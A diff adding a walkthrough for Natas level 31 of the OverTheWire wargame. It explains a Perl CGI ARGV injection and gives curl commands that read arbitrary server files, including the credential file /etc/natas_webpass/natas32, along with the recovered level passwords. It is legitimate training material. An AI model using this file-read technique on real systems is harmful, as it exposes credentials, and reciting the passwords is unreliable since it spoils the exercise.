@@ -586,3 +586,28 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Password for natas31:** `aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z`
 - **Verification:** `http://natas31.natas.labs.overthewire.org/` with `natas31:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L30.cast`
+
+## Level 31 → natas32
+- **Account:** `natas31`, password `aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z`.
+- **Goal:** CSV-to-HTML uploader: `if ($cgi->upload('file')) { my $file = $cgi->param('file'); while (<$file>) {...} }`. The "file" is opened by Perl's two-argument `open` on the *string* returned by `param`.
+- **Technique and why it works:** **CGI `param`/`@ARGV` injection**. `$cgi->param('file')` is not guaranteed to be an uploaded filehandle: a multipart body may contain a plain text field named `file`, and `param` returns the *first* value in the body order. If we send `file=ARGV` as a plain field before the actual upload, `param('file')` returns the string `ARGV`, and Perl's two-argument `open("ARGV")` opens the magic filehandle `ARGV`, which reads `@ARGV`. `CGI.pm` fills `@ARGV` from the query string for keyword-style requests, so the path we put in the query string becomes the file that `while (<$file>)` reads line by line — and the lines are printed into the table. This is the classic "ARGV injection" bug class.
+
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.** `$cgi->upload('file')` only checks that *some* file field was sent; the handle used is `param('file')`, which can be any value.
+2. **Send a plain field first.**
+   ```
+   curl -s -u natas31:<pw> -F 'file=ARGV' -F 'file=@/tmp/t.csv' \
+        'http://natas31.natas.labs.overthewire.org/index.pl?/etc/hostname'
+   # table shows: natas-0
+   ```
+   The plain field makes `param('file')` = `ARGV`; `open("ARGV")` reads `@ARGV`, which CGI populated from the query string `?/etc/hostname`.
+3. **Read the target file.**
+   ```
+   curl -s -u natas31:<pw> -F 'file=ARGV' -F 'file=@/tmp/t.csv' \
+        'http://natas31.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas32'
+   # Rc3837d6qd3KoW0R2IgKssMXRX06btgY
+   ```
+4. **Verify.** `curl -u natas32:<pw> http://natas32.natas.labs.overthewire.org/` → HTTP 200.
+- **Password for natas32:** `Rc3837d6qd3KoW0R2IgKssMXRX06btgY`
+- **Verification:** `http://natas32.natas.labs.overthewire.org/` with `natas32:<password>` → HTTP 200.
+- **Recording:** `recordings/natas/L31.cast`
